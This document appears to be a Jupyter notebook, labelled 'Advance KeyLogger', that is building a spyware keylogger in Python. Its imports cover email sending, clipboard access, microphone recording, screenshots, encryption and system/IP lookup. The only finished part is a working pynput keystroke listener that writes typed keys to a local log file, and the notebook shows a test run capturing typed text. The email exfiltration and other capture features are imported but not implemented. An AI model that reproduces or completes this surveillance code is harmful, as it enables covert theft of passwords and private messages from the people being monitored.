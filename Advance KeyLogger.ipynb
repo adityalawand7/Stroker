{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "35df539b",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Libraries to be used\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.base import MIMEBase\n",
    "from email import encoders\n",
    "import smtplib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a3234c51",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import platform"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "c721196d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import win32clipboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ed17c216",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ce5d5ec2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d8cfe7e0",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scipy.io.wavfile import write\n",
    "import sounddevice as sd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a86ab40b",
   "metadata": {},
   "outputs": [],
   "source": [
    "from cryptography.fernet import Fernet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "fd57b725",
   "metadata": {},
   "outputs": [],
   "source": [
    "import getpass\n",
    "from requests import get"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "5e50ee91",
   "metadata": {},
   "outputs": [],
   "source": [
    "from multiprocessing import Process, freeze_support\n",
    "from PIL import ImageGrab"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "b6f0e6c7",
   "metadata": {},
   "outputs": [],
   "source": [
    "#default variables\n",
    "keys_information = \"key_log.txt\"\n",
    "file_path = \"C:\\\\Users\\\\lawan\\\\KeyLogger_Info\"\n",
    "extend = \"\\\\\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "a694ff54",
   "metadata": {},
   "outputs": [],
   "source": [
    "count = 0\n",
    "keys = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "c675ea29",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    global keys, count\n",
    "    print(key)\n",
    "    keys.append(key)\n",
    "    count += 1\n",
    "    if(count>1):\n",
    "        count = 0\n",
    "        write_file(keys)\n",
    "        keys = []\n",
    "\n",
    "def write_file(keys):\n",
    "    with open(file_path + extend + keys_information, \"a\") as f:\n",
    "        for key in keys:\n",
    "            k = str(key).replace(\"'\",\"\")\n",
    "            if k.find(\"space\") > 0:\n",
    "                f.write('\\n')\n",
    "#                 f.close()\n",
    "            elif k.find(\"Key\") == -1:\n",
    "                f.write(k)\n",
    "#                 f.close()\n",
    "    f.close()\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "a55befc8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "Key.backspace\n",
      "'h'\n",
      "'e'\n",
      "'l'\n",
      "'l'\n",
      "'o'\n",
      "'w'\n",
      "Key.space\n",
      "'w'\n",
      "'o'\n",
      "'r'\n",
      "'l'\n",
      "'d'\n",
      "Key.alt_l\n",
      "Key.backspace\n",
      "Key.esc\n"
     ]
    }
   ],
   "source": [
    "with Listener(on_press = on_press, on_release = on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "407563a2",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
